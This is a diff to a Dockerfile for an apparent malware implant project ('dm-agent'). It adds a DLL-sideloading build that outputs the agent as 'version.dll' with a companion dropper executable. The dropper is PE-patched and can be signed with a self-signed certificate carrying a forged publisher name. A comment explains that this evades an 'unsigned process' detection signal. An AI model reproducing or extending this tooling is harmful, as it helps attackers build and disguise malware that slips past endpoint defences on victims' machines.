@@ -46,6 +46,8 @@ ARG DM_PACK_STAGER=false
 # X.509 subject string for Authenticode signing, e.g. "/C=US/O=Acme Corp/CN=Acme Software".
 # Leave empty to skip signing.  Signed binaries score lower on ATD's "unsigned process" signal.
 ARG DM_SIGN_SUBJECT=
+# Set to true when dll-sideload feature is requested — compiles as cdylib instead of bin.
+ARG DM_DLL_BUILD=false
 
 ENV DM_TARGET=$DM_TARGET \
     DM_BIN=$DM_BIN \
@@ -75,20 +77,36 @@ RUN mkdir /output
 RUN --mount=type=cache,id=dm-cargo-registry,target=/root/.cargo/registry \
     --mount=type=cache,id=dm-cargo-git,target=/root/.cargo/git \
     --mount=type=cache,id=dm-cargo-target,target=/build/target,sharing=locked \
-    if [ -n "$DM_FEATURES" ]; then \
-        cargo build --release --bin dm-agent --target $DM_TARGET --features "$DM_FEATURES"; \
+    if [ "$DM_DLL_BUILD" = "true" ]; then \
+        cargo build --release --lib --target $DM_TARGET --features "$DM_FEATURES" && \
+        cargo build --release --bin dm-dropper --target $DM_TARGET --no-default-features && \
+        cp /build/target/${DM_TARGET}/release/dm_agent_dll.dll /output/version.dll && \
+        cp /build/target/${DM_TARGET}/release/dm-dropper.exe /output/dm-dropper.exe && \
+        python3 /deploy/pe_patch.py /output/dm-dropper.exe --inplace && \
+        if [ -n "$DM_SIGN_SUBJECT" ]; then \
+            openssl req -new -x509 -newkey rsa:2048 -keyout /tmp/cs.key -out /tmp/cs.crt \
+                -days 3650 -nodes -subj "$DM_SIGN_SUBJECT" 2>/dev/null && \
+            osslsigncode sign -certs /tmp/cs.crt -key /tmp/cs.key \
+                -h sha256 -in /output/dm-dropper.exe -out /output/dm-dropper.exe.signed && \
+            mv /output/dm-dropper.exe.signed /output/dm-dropper.exe && \
+            rm -f /tmp/cs.key /tmp/cs.crt; \
+        fi; \
     else \
-        cargo build --release --bin dm-agent --target $DM_TARGET; \
-    fi && \
-    cp /build/target/${DM_TARGET}/release/${DM_BIN} /output/${DM_BIN} && \
-    python3 /deploy/pe_patch.py "/output/${DM_BIN}" --inplace && \
-    if [ "$DM_PACK_STAGER" != "true" ] && [ -n "$DM_SIGN_SUBJECT" ]; then \
-        openssl req -new -x509 -newkey rsa:2048 -keyout /tmp/cs.key -out /tmp/cs.crt \
-            -days 3650 -nodes -subj "$DM_SIGN_SUBJECT" 2>/dev/null && \
-        osslsigncode sign -certs /tmp/cs.crt -key /tmp/cs.key \
-            -h sha256 -in "/output/${DM_BIN}" -out "/output/${DM_BIN}.signed" && \
-        mv "/output/${DM_BIN}.signed" "/output/${DM_BIN}" && \
-        rm -f /tmp/cs.key /tmp/cs.crt; \
+        if [ -n "$DM_FEATURES" ]; then \
+            cargo build --release --bin dm-agent --target $DM_TARGET --features "$DM_FEATURES"; \
+        else \
+            cargo build --release --bin dm-agent --target $DM_TARGET; \
+        fi && \
+        cp /build/target/${DM_TARGET}/release/${DM_BIN} /output/${DM_BIN} && \
+        python3 /deploy/pe_patch.py "/output/${DM_BIN}" --inplace && \
+        if [ "$DM_PACK_STAGER" != "true" ] && [ -n "$DM_SIGN_SUBJECT" ]; then \
+            openssl req -new -x509 -newkey rsa:2048 -keyout /tmp/cs.key -out /tmp/cs.crt \
+                -days 3650 -nodes -subj "$DM_SIGN_SUBJECT" 2>/dev/null && \
+            osslsigncode sign -certs /tmp/cs.crt -key /tmp/cs.key \
+                -h sha256 -in "/output/${DM_BIN}" -out "/output/${DM_BIN}.signed" && \
+            mv "/output/${DM_BIN}.signed" "/output/${DM_BIN}" && \
+            rm -f /tmp/cs.key /tmp/cs.crt; \
+        fi; \
     fi
 
 # ── Packer stub (optional, DM_PACK_STAGER=true) ──────────────────────────────
